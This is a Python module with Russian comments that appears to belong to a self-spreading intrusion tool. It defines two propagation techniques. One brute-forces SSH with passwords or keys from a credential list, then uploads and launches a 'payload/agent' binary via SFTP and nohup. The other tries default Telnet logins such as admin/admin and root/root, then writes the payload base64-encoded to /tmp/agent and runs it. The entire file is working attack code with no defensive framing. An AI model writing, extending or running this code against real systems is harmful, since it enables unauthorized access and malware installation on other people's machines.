from abc import ABC, abstractmethod
import paramiko
import socket
import telnetlib
import base64
import os

class Technique(ABC):
    name = ""
    description = ""

    @abstractmethod
    def applicable(self, host):
        pass

    @abstractmethod
    def execute(self, host, creds_db):
        pass


class SSHBruteForce(Technique):
    name = "ssh_bruteforce"
    description = "Пробуем логин/пароль или SSH-ключи по SSH"

    def applicable(self, host):
        # годится, если открыт порт 22
        return 22 in host.get("ports", [])

    def execute(self, host, creds_db):
        ip = host["ip"]
        for user, secret in creds_db:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                if os.path.isfile(secret):
                    
                    client.connect(ip, port=22, username=user,
                                   key_filename=secret,
                                   timeout=5, allow_agent=False, look_for_keys=False)
                else:
                    
                    client.connect(ip, port=22, username=user,
                                   password=secret,
                                   timeout=5, allow_agent=False, look_for_keys=False)
                sftp = client.open_sftp()
                remote_path = "/tmp/agent" if os.name != "nt" else r"C:\Windows\Temp\agent.exe"
                sftp.put("payload/agent", remote_path)
                cmd = f"chmod +x {remote_path} && nohup {remote_path} &" if os.name != "nt" else remote_path
                client.exec_command(cmd)
                client.close()
                return True
            except (paramiko.AuthenticationException, socket.error):
                continue
        return False


class TelnetDefaults(Technique):
    name = "telnet_defaults"
    description = "Проверяем стандартные логин/пароль для Telnet"

    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("root", "root"),
        ("user", "user"),
        ("admin", "password"),
    ]

    def applicable(self, host):
        return 23 in host.get("ports", [])

    def execute(self, host, creds_db=None):
        ip = host["ip"]
        for user, pwd in self.DEFAULT_CREDS:
            try:
                tn = telnetlib.Telnet(ip, 23, timeout=5)
                tn.read_until(b"login:", timeout=3)
                tn.write(user.encode("ascii") + b"\n")
                tn.read_until(b"assword:", timeout=3)
                tn.write(pwd.encode("ascii") + b"\n")
                data = tn.read_until(b"$", timeout=3)
                if data.endswith(b"$"):
                    raw = open("payload/agent", "rb").read()
                    b64 = base64.b64encode(raw)
                    tn.write(b"echo " + b64 + b" | base64 -d > /tmp/agent\n")
                    tn.write(b"chmod +x /tmp/agent && nohup /tmp/agent &\n")
                    tn.close()
                    return True
            except Exception:
                continue
        return False

ALL_TECHNIQUES = [
    SSHBruteForce(),
    TelnetDefaults(),
]
